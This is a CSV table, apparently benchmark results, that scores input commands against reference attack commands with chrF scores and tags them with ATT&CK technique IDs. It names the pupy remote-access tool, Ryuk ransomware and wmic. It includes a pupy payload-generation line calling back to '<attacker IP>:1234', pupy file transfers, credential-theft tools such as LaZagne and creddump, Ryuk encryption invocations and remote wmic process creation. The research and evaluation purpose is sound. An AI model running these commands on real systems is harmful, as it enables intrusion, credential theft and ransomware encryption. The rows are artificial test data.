file,tool,input_command,matched_command,chrf_score,match_found
command_pupy_TA0004_T1078.txt,pupy,lazagne windows,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,22.745,True
command_pupy_TA0004_T1078.txt,pupy,creddump linux,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",8.58,True
command_pupy_TA0004_T1078.txt,pupy,hashmon /path/to/memory/directory,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",12.048,True
command_pupy_TA0004_T1078.txt,pupy,loot_memory --browser=browser_name,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",15.183,True
command_pupy_TA0005_T1078.txt,pupy,run Lazagne,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",6.349,True
command_ryuk_TA0003_T1547.txt,ryuk,"ryuk -e --process-name ""GRIFFON"" --drop-bat-files",`ryuk.exe --encrypt --process-name notepad.exe`,36.507,True
command_ryuk_TA0004_T1547.txt,ryuk,ryuk.exe --process-name <process_name> -e,`ryuk.exe --encrypt --process-name notepad.exe`,54.851,True
command_wmic_TA0002_T1047.txt,wmic,wmic csproduct get uuid,"`wmic /node:#{""POS system""} process call create #{""executable""}`",15.452,True
command_wmic_TA0002_T1047.txt,wmic,wmic os get osarchitecture,"`wmic /node:#{""POS system""} process call create #{""executable""}`",16.369,True
command_wmic_TA0002_T1047.txt,wmic,wmic cpu get processorid,"`wmic /node:#{""POS system""} process call create #{""executable""}`",27.231,True
command_wmic_TA0002_T1047.txt,wmic,"wmic diskdrive get model, size","`wmic /node:#{""POS system""} process call create #{""executable""}`",13.097,True
command_wmic_TA0002_T1047.txt,wmic,wmic logicaldisk get volumeSerialNumber,"`wmic /node:#{""POS system""} process call create #{""executable""}`",14.177,True
command_wmic_TA0002_T1047.txt,wmic,"wmic process call create ""notepad.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`",51.612,True
